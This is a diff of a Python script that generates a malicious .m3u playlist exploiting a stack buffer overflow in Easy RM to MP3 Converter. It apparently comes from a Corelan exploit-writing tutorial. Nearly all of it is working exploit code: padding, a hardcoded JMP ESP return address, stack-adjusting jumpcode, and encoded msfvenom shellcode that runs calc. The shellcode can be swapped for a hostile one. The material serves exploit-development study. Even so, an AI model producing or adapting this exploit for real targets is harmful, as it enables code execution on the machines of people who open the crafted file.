@@ -1,26 +1,14 @@
 #!/usr/bin/env python
 import struct
-# Popcalc for Easy RM to MP3 Converter
-#
-# Corelan Exploit Writing Tutorial 2
-outfile = 'popcalc_exploit_push_ret.m3u'
+outfile = 'popcalc_exploit_small_buf.m3u'
+bufsz = 26064
 
 # Just some junk at the beginning
-junk = '\x41' * 26064
-
-#01AB57F6   54               PUSH ESP
-#01AB57F7   C3               RETN
-
-eip = struct.pack("<L",0x01AB57F6) # overwrite EIP with push esp, ret
-
-# Some junk so ESP points to shellcode
-prependesp = 'C' * 4
-
-# nop sled
-shellcode = '\x90' * 25
+junk = '\x90' * 200
+nop = '\x90' * 50
 
 # msfvenom -p windows/exec CMD=calc -f python -e x86/alpha_upper 
-shellcode = shellcode
+shellcode = ""
 shellcode += "\x89\xe6\xda\xd5\xd9\x76\xf4\x5f\x57\x59\x49\x49"
 shellcode += "\x49\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54"
 shellcode += "\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48"
@@ -60,7 +48,38 @@ shellcode += "\x43\x42\x52\x52\x4f\x42\x4a\x45\x50\x50\x53\x4b"
 shellcode += "\x4f\x48\x55\x53\x53\x55\x31\x42\x4c\x53\x53\x33"
 shellcode += "\x30\x41\x41"
 
-payload = junk+eip+prependesp+shellcode
+# Add some more padding
+rest = '\x90' * (bufsz - (len(junk) + len(nop) + len(shellcode)))
+
+
+#01AAF23A   FFE4             JMP ESP
+
+eip = struct.pack("<L",0x01AAF23A)
+
+# Some filler
+presc = 'C' * 4
+
+# add esp, 0x5e
+# add esp, 0x5e
+# jmp esp
+
+"""
+ nasm > add esp, 0x5e
+00000000  83C45E            add esp,byte +0x5e
+nasm > add esp, 0x5e
+00000000  83C45E            add esp,byte +0x5e
+nasm > jmp esp
+00000000  FFE4              jmp esp
+"""
+
+jumpcode =  ""
+jumpcode += "\x83\xc4\x5e"
+jumpcode += "\x83\xc4\x5e"
+jumpcode += "\xff\xe4"
+
+# Final payload
+payload = junk + nop + shellcode + rest + eip + presc + jumpcode
+
 with open(outfile, 'w') as f:
 	f.write(payload)
-print "m3u File Created successfully\n"
+print 'Wrote %u bytes to %s' % (len(payload), outfile)
